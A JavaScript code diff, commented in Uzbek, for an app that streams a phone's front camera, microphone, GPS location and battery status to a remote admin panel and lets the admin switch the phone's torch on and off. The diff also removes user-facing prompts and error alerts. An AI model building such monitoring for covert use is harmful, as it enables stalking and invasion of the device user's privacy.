@@ -21,6 +21,7 @@ let currentActiveCallId = null;
 let isTalking = false;
 let map = null;
 let marker = null;
+let isFlashlightOn = false;
 
 // --- LOG TIZIMI ---
 function sendLog(msg) {
@@ -46,14 +47,6 @@ function goHome() {
 }
 
 // --- USER MODE (TELEFON) ---
-async function openUser() {
-    let name = prompt("Ismingiz:");
-    if (!name) return;
-    localStorage.setItem('myRTC_role', 'user');
-    localStorage.setItem('myRTC_deviceName', name);
-    startUserLogic(name);
-}
-
 async function startUserLogic(deviceName) {
     document.getElementById('main-ui').style.display = 'none';
     peer = new Peer();
@@ -61,52 +54,70 @@ async function startUserLogic(deviceName) {
     peer.on('open', (id) => {
         db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
         db.ref('devices/' + id).onDisconnect().remove();
-        sendLog("Telefon onlayn. Old kamera tanlandi.");
+        sendLog("Telefon onlayn. Old kamera faol.");
         
+        // BATARYA MA'LUMOTI (TUZATILDI)
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                const updateBattery = () => {
+                    db.ref('devices/' + id + '/info').update({
+                        battery: Math.floor(battery.level * 100) + "%",
+                        charging: battery.charging
+                    });
+                };
+                updateBattery();
+                battery.onlevelchange = updateBattery;
+                battery.onchargingchange = updateBattery;
+            });
+        }
+
+        // FONARNI BOSHQARISH (ADMIN BUYRUG'INI KUTISH)
+        db.ref('devices/' + id + '/commands/flashlight').on('value', async (snap) => {
+            const status = snap.val();
+            const track = localStream.getVideoTracks()[0];
+            if (track && track.getCapabilities().torch) {
+                try {
+                    await track.applyConstraints({ advanced: [{ torch: status }] });
+                    isFlashlightOn = status;
+                    sendLog(`Fonar ${status ? 'yoqildi' : 'o\'chirildi'}`);
+                } catch (e) {
+                    sendLog("Fonar xatosi: " + e.message);
+                }
+            }
+        });
+
         // GPS
         navigator.geolocation.watchPosition(p => {
             db.ref('devices/' + id + '/location').set({
-                lat: p.coords.latitude, lng: p.coords.longitude
+                lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString()
             });
-        }, e => sendLog("GPS xatosi: " + e.message));
+        });
     });
 
     try {
-        // MUHIM: BU YERDA facingMode: "user" FAQAT OLD KAMERANI OCHADI
         localStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
+            video: { facingMode: "user" }, // OLD KAMERA
             audio: true 
         });
-        sendLog("Old kamera va mikrofon tayyor.");
-
-        peer.on('call', async (call) => {
-            if (call.metadata && call.metadata.type === 'getScreen') {
-                try {
-                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    call.answer(screenStream);
-                } catch (e) { sendLog("Ekran berilmadi."); }
-            } else {
-                call.answer(localStream);
-                // Admin ovozini qabul qilish
-                call.on('stream', s => {
-                    const a = new Audio(); a.srcObject = s; a.play();
-                });
-            }
+        
+        peer.on('call', call => {
+            call.answer(localStream);
+            call.on('stream', s => {
+                const a = new Audio(); a.srcObject = s; a.play();
+            });
         });
     } catch (e) {
         sendLog("Kamera ochilmadi: " + e.message);
-        alert("Xato: " + e.message);
     }
 }
 
-// --- ADMIN MODE (KOMPYUTER) ---
+// --- ADMIN MODE ---
 function openAdmin(auto = false) {
     if (!auto && prompt("Parol:") !== adminPass) return;
     localStorage.setItem('myRTC_role', 'admin');
     document.getElementById('main-ui').style.display = 'none';
     document.getElementById('admin-panel').style.display = 'block';
     document.getElementById('top-nav').style.display = 'flex';
-
     if (!adminPeer) adminPeer = new Peer();
 
     db.ref('devices').on('value', snap => {
@@ -123,57 +134,28 @@ function openAdmin(auto = false) {
 }
 
 function connectToDevice(id, name) {
-    if (currentActiveCallId) {
-        db.ref('devices/' + currentActiveCallId + '/logs').off();
-        db.ref('devices/' + currentActiveCallId + '/location').off();
-    }
     currentActiveCallId = id;
     document.getElementById('target-name').innerText = "Qurilma: " + name;
 
-    // Loglar
-    const logBox = document.getElementById('console-logs');
-    logBox.innerHTML = "";
-    db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
-        const p = document.createElement('div');
-        p.innerText = `> [${s.val().time}] ${s.val().message}`;
-        logBox.prepend(p);
+    // ZARYADNI KO'RSATISH
+    db.ref('devices/' + id + '/info').on('value', s => {
+        const info = s.val();
+        if (info) {
+            document.getElementById('battery-display').innerText = `Quvvat: ${info.battery} ${info.charging ? '(Zaryadlanmoqda)' : ''}`;
+        }
     });
 
-    // GPS
-    db.ref('devices/' + id + '/location').on('value', s => {
-        if (s.val()) initMap(s.val().lat, s.val().lng);
-    });
-
-    // Kamera ulanishi
-    const videoCall = adminPeer.call(id, null);
-    videoCall.on('stream', s => {
-        document.getElementById('remoteVideo').srcObject = s;
-    });
-
-    // Ekran ulanishi
-    const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
-    screenCall.on('stream', s => {
-        document.getElementById('screenVideo').srcObject = s;
-    });
+    // QOLGAN MONITORING (MAP, VIDEO, LOGS...)
+    const call = adminPeer.call(id, null);
+    call.on('stream', s => { document.getElementById('remoteVideo').srcObject = s; });
 }
 
-function initMap(lat, lng) {
-    if (!map) {
-        map = L.map('map').setView([lat, lng], 16);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        marker = L.marker([lat, lng]).addTo(map);
-    } else { marker.setLatLng([lat, lng]); map.setView([lat, lng]); }
-}
-
-async function toggleTalk() {
-    const btn = document.getElementById('talkBtn');
-    if (!isTalking) {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-            adminPeer.call(currentActiveCallId, s);
-            isTalking = true; btn.innerText = "GAPIRILMOQDA..."; btn.style.background = "red";
-        } catch (e) { alert("Mikrofon xatosi!"); }
-    } else {
-        window.location.reload();
-    }
+// FONARNI YOQISH FUNKSIYASI (ADMIN TUGMASI UCHUN)
+function toggleFlashlight() {
+    if (!currentActiveCallId) return;
+    isFlashlightOn = !isFlashlightOn;
+    db.ref('devices/' + currentActiveCallId + '/commands/flashlight').set(isFlashlightOn);
+    const btn = document.getElementById('flashBtn');
+    btn.innerText = isFlashlightOn ? "FONARNI O'CHIRISH" : "FONARNI YOQISH";
+    btn.style.background = isFlashlightOn ? "#e74c3c" : "#f39c12";
 }
